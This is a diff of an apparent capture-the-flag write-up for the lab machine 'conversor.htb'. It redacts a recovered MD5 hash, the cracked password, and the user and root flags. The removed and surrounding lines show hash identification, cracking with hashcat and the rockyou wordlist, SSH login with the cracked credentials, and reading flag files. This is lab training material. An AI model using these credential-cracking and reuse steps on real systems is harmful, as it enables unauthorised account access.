@@ -400,7 +400,7 @@ SELECT * FROM users;
 Result:
 
 ```
-1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+1|fismathack|[REDACTED]
 5|test|098f6bcd4621d373cade4e832627b4f6
 ```
 
@@ -411,7 +411,7 @@ We've discovered the `fismathack` user with an MD5 password hash.
 We use name-that-hash to confirm the hash type:
 
 ```bash
-nth -t 5b5c3ac3a1c897c94caad48e6c71fdec
+nth -t [REDACTED]
 ```
 
 Result:
@@ -429,22 +429,22 @@ Domain Cached Credentials, HC: 1100 JtR: mscach
 We crack the MD5 hash using hashcat:
 
 ```bash
-echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
+echo "[REDACTED]" > hash.txt
 hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4
 ```
 
 Result:
 
 ```
-5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
+[REDACTED]:[REDACTED]
 
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 0 (MD5)
-Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
+Hash.Target......: [REDACTED]
 ```
 
-Credentials obtained: `fismathack:Keepmesafeandwarm`
+Credentials obtained: `fismathack:[REDACTED]`
 
 ### SSH Access
 
@@ -452,7 +452,7 @@ We connect via SSH with the recovered credentials:
 
 ```bash
 ssh fismathack@conversor.htb
-# Password: Keepmesafeandwarm
+# Password: [REDACTED]
 ```
 
 Success! We can now retrieve the user flag:
@@ -461,7 +461,7 @@ Success! We can now retrieve the user flag:
 cat user.txt
 ```
 
-Flag: `2936abb855d32318ec34fa57b304035b`
+Flag: `[REDACTED]`
 
 ## Privilege Escalation to Root
 
@@ -656,7 +656,7 @@ Finally, we retrieve the root flag:
 cat /root/root.txt
 ```
 
-Flag: `4768ecc50ae5b7b36d84de17f56e24ac`
+Flag: `[REDACTED]`
 
 ## Key Takeaways
 
